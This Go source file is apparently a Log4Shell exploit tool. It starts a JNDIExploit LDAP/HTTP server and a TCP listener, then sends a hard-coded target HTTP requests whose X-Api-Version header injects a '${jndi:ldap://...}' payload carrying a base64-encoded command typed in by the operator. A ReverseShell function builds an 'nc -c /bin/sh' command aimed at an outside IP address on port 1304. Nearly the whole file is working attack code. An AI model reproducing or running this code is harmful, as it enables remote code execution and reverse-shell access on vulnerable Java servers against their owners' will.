package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	externalip "github.com/glendc/go-external-ip"
)

func main() {
	banner()
	startPayload := make(chan bool)
	go func() {
		StartNcat()
		ExecJNDI(startPayload)
	}()
	go func() {
		<-startPayload
		PayloadInput()
		fmt.Println("Press Ctrl+C to exit.")
	}()
	select {}
}

func banner() {
	ban := `
	_______ _______      ___     _______ _______ _   ___ _______ __   __ _______ ___     ___     
	|       |       |    |   |   |       |       | | |   |       |  | |  |       |   |   |   |    
	|    ___|   _   |____|   |   |   _   |    ___| |_|   |  _____|  |_|  |    ___|   |   |   |    
	|   | __|  | |  |____|   |   |  | |  |   | __|       | |_____|       |   |___|   |   |   |    
	|   ||  |  |_|  |    |   |___|  |_|  |   ||  |___    |_____  |       |    ___|   |___|   |___ 
	|   |_| |       |    |       |       |   |_| |   |   |_____| |   _   |   |___|       |       |
	|_______|_______|    |_______|_______|_______|   |___|_______|__| |__|_______|_______|_______|   by Chris Wong
`
	targetip, targetport := TargetInfo()
	fmt.Println(Cyan + ban + Reset)
	fmt.Println("------------------------------------------------------------------")
	fmt.Println("This is a JNDI exploit tool.")
	fmt.Println("This tool will start a JNDI exploit server and generate a payload.")
	fmt.Println("Prefix with" + Red + " [+] " + Reset + "related to starting server.")
	fmt.Println("------------------------------------------------------------------")
	ListInfo()
	fmt.Println("Target: " + targetip + ":" + targetport)
	fmt.Println("------------------------------------------------------------------")
}

var Reset = "\033[0m"
var Red = "\033[31m"
var Green = "\033[32m"
var Yellow = "\033[33m"
var Blue = "\033[34m"
var Magenta = "\033[35m"
var Cyan = "\033[36m"
var Gray = "\033[37m"
var White = "\033[97m"

func ExecJNDI(startPayload chan<- bool) {
	jndipath := "./dependencies/jndiexploit1.2/JNDIExploit-1.2-SNAPSHOT.jar"
	javapath := FindPath()
	ip, err := GetIntIP()
	if err != nil {
		fmt.Println("[+] Error:", err)
		return
	}
	fmt.Println("[+] Starting JNDI exploit server...")
	javapathcmd := exec.Command(javapath, "-jar", jndipath, "-i", ip.String(), "-p", "8888")
	stdout, err := javapathcmd.StdoutPipe()
	if err != nil {
		fmt.Println("[+] Error creating stdout pipe:", err)
		return
	}
	err = javapathcmd.Start()
	if err != nil {
		fmt.Println("[+] Error starting command:", err)
		return
	}
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		var output strings.Builder
		buf := make([]byte, 1024)
		for {
			n, err := stdout.Read(buf)
			if err != nil {
				break
			}
			output.Write(buf[:n])
			fmt.Print(string(buf[:n]))
			if strings.Contains(output.String(), "[+] HTTP Server Start Listening on 8888") {
				startPayload <- true
				break
			}
		}
	}()
	err = javapathcmd.Wait()
	if err != nil {
		fmt.Println("[+] Error:", err)
	}
	wg.Wait()
}

func FindPath() string {
	fmt.Println("Checking Java...")
	javapath, err := exec.Command("which", "java").Output()
	if err != nil || len(javapath) == 0 {
		fmt.Println("Java is not found.")
		newjavapath := "./dependencies/jdk_1.8.0_102/bin/java"
		fmt.Println("Java path:", newjavapath)
		return newjavapath
	} else {
		fmt.Println("Java is found.")
		javapath := strings.TrimSpace(string(javapath))
		fmt.Println("Java path:", javapath)
		return javapath
	}
}

var ip, err = GetIntIP()
var newip = ip.String()

func StartServer(host string, port int) {
	log.SetFlags(0)
	addr := fmt.Sprintf("%s:%d", newip, port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		panic(err)
	}
	log.Printf("[+] Listening for connections on %s", listener.Addr().String())
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[+] Error accepting connection from client: %s", err)
		} else {
			go processClient(conn)
		}
	}
}

func processClient(conn net.Conn) {
	_, err := io.Copy(os.Stdout, conn)
	if err != nil {
		fmt.Println(err)
	}
	conn.Close()
}

var (
	listen = flag.Bool("l", true, "Listen")
	host   = flag.String("h", newip, "Host")
	port   = flag.Int("p", 1304, "Port")
)

func StartNcat() {
	flag.Parse()
	if *listen {
		fmt.Println("[+] Starting ncat server...")
		go StartServer(*host, *port)
		fmt.Println("[+] Successfully started ncat server.")
	}
}

func PayloadInput() {
	var payloadcmd string
	targetip, targetport := TargetInfo()
	sourceip, err := GetIntIP()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Testing curl...")
	_, err = http.Get("http://" + targetip + ":" + targetport)
	if err != nil {
		fmt.Println("Error:", err)
		return
	} else {
		fmt.Println("Curl successful.")
		for {
			fmt.Println("Enter the payload command:")
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				payloadcmd = scanner.Text()
			}
			fmt.Println("Payload command:", payloadcmd)
			encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
			fmt.Println("Sending payload...")
			targeturl := "http://" + targetip + ":" + targetport
			req, err := http.NewRequest("GET", targeturl, nil)
			req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
			if err != nil {
				fmt.Println("Error:", err)
				return
			}
			client := &http.Client{
				Timeout: 5 * time.Second,
			}
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Error:", err)
				fmt.Println("Please try again.")
				continue
			}
			defer resp.Body.Close()
			responseBody, err := io.ReadAll(resp.Body)
			if err != nil {
				fmt.Println("Error:", err)
				fmt.Println("Please try again.")
				continue
			}
			if string(responseBody) == "Hello, world!" {
				fmt.Println("Payload sent. Exploit successful.")
				fmt.Println("Do you want to send another payload? (yes/no)")
				if scanner.Scan() {
					response := scanner.Text()
					if response != "yes" {
						break
					}
				}
			} else {
				fmt.Println("Payload failed. Please try again.")
				continue
			}
		}
	}
}

func ReverseShell() {
	// externalip, err := sysinfo.GetExtIP()
	// if err != nil {
	// 	return
	// }
	targetip := "217.142.235.125"
	targetcmd := "nc -c /bin/sh " + targetip + " 1304"
	fmt.Println("Target command:", targetcmd)

	// ncat -v -lp 8081 //listener
	// nc -v 192.168.0.164 8081
}

func GetIntIP() (net.IP, error) {
	var (
		ret    net.IP
		err    error
		ifaces []net.Interface
		addrs  []net.Addr
	)
	if ifaces, err = net.Interfaces(); err == nil {
		for _, i := range ifaces {
			if addrs, err = i.Addrs(); err == nil {
				for _, a := range addrs {
					if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
						if ipv4 := ipnet.IP.To4(); ipv4 != nil && ipv4.IsGlobalUnicast() {
							ret = ipv4
							return ret, nil
						}
					}
				}
			}
		}
	}
	fmt.Println("Error:", err)
	return nil, err
}

func GetExtIP() (string, error) {
	consensus := externalip.DefaultConsensus(nil, nil)
	ip, err := consensus.ExternalIP()
	if err != nil {
		return "", err
	}
	return ip.String(), nil
}

func ListInfo() {
	ip, err := GetIntIP()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Internal IP:", ip)
	ipString, err := GetExtIP()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	ip = net.ParseIP(ipString)
	fmt.Println("External IP:", ip)
}

func TargetInfo() (string, string) {
	targetip := "192.168.78.100"
	targetport := "8080"
	return targetip, targetport
}
